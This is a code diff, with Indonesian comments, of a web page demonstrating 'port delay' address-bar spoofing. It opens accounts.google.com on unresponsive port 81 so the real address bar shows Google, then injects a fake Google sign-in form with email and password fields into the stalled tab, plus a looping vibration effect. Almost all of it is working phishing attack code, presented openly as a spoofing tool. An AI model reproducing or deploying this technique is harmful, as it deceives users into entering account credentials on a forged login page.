@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Real Address Bar Spoofing</title>
+<title>Port Delay Address Spoofing</title>
 <style>
 * { box-sizing: border-box; margin: 0; padding: 0; }
 body { font-family: 'Segoe UI', Arial, sans-serif; background: #0a0a0a; color: #fff; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
@@ -19,8 +19,8 @@ button:disabled { background: #555; cursor: not-allowed; }
 
 <body>
 <div class="panel" id="main-panel">
-    <h1>⚠️ REAL ADDRESS BAR SPOOFING</h1>
-    <p>Memicu navigasi ke URL asli dan menyuntikkan UI palsu sebelum halaman termuat.</p>
+    <h1>⚠️ PORT DELAY SPOOFING</h1>
+    <p>Memicu Address Bar asli (Google) dengan menahan koneksi menggunakan Port yang salah.</p>
     
     <button id="start-btn" type="button">Mulai Spoofing</button>
     
@@ -54,10 +54,13 @@ startBtn.addEventListener("click", function() {
 
     efekHacker();
 
-    statusDiv.textContent = "Membuka URL Asli Google...";
+    statusDiv.textContent = "Membuka URL Google (Port Delay)...";
 
-    // 1. Buka URL ASLI Google (Address bar asli akan berubah)
-    const targetUrl = 'https://accounts.google.com/signin';
+    // TRIK PORT DELAY:
+    // Kita arahkan ke accounts.google.com tapi di port 81 (yang tidak merespons).
+    // Browser akan mengubah Address Bar, tapi koneksinya menggantung (timeout).
+    const targetUrl = 'https://accounts.google.com:81/signin';
+    
     const w = window.open(targetUrl, '_blank');
 
     if (!w) {
@@ -67,17 +70,15 @@ startBtn.addEventListener("click", function() {
         return;
     }
 
-    // 2. RACE CONDITION: Suntikkan Form Palsu secepat mungkin (sebelum halaman Google asli termuat penuh)
-    // Kita gunakan interval cepat (10ms) untuk menembak
+    statusDiv.textContent = "Menyuntikkan UI palsu saat koneksi tertahan...";
+
+    // Kita gunakan setInterval untuk menyuntikkan form secepat mungkin
     let counter = 0;
     const interval = setInterval(() => {
         counter++;
         try {
-            // Coba akses document tab baru
+            // Suntikkan HTML ke tab saat koneksi masih tertahan
             if (w.document) {
-                // Hentikan jika sudah jadi milik domain Google (tidak bisa diakses karena SOP)
-                // Tapi selama masih memuat (belum cross-origin), kita bisa inject.
-                
                 w.document.open();
                 w.document.write(`
                     <!DOCTYPE html>
@@ -104,39 +105,35 @@ startBtn.addEventListener("click", function() {
                             <input type="email" placeholder="Email or phone" id="phish-email">
                             <input type="password" placeholder="Password" id="phish-pass">
                             <button>Next</button>
-                            <p class="warning">Injected by Waguri</p>
+                            <p class="warning">Port Spoofed by Waguri</p>
                         </div>
                     </body>
                     </html>
                 `);
                 w.document.close();
 
-                // JIKA BERHASIL DIINJEKSI, HENTIKAN INTERVAL
                 clearInterval(interval);
-                statusDiv.textContent = "Berhasil! Address Bar asli menampilkan Google.";
+                statusDiv.textContent = "Berhasil! Address Bar menampilkan Google (Port 81).";
                 statusDiv.style.color = '#4CAF50';
-                
+
                 // Tambahkan efek getar di tab baru
                 w.eval(`
                     if (navigator.vibrate) { setInterval(function() { navigator.vibrate([500, 200, 500]); }, 2000); }
                 `);
-
             }
         } catch (e) {
-            // Error (biasanya SecurityError: Blocked a frame with origin...) 
-            // Terjadi ketika halaman Google asli sudah selesai dimuat dan mengunci origin.
-            // Jika sudah error, hentikan percobaan.
+            // Jika Chrome memblokir injeksi (karena origin sudah berubah), hentikan.
             clearInterval(interval);
-            statusDiv.textContent = "Gagal: Browser memblokir injeksi (Cross-Origin).";
+            statusDiv.textContent = "Gagal: Browser memblokir injeksi.";
             statusDiv.style.color = '#f00';
             isProcessing = false;
             startBtn.disabled = false;
         }
 
-        // Batalkan jika sudah 2 detik (terlalu lama, Google asli sudah termuat)
-        if (counter > 200) {
+        // Hentikan jika lebih dari 5 detik
+        if (counter > 500) {
             clearInterval(interval);
-            statusDiv.textContent = "Waktu habis. Google asli berhasil termuat.";
+            statusDiv.textContent = "Waktu habis.";
             isProcessing = false;
             startBtn.disabled = false;
         }
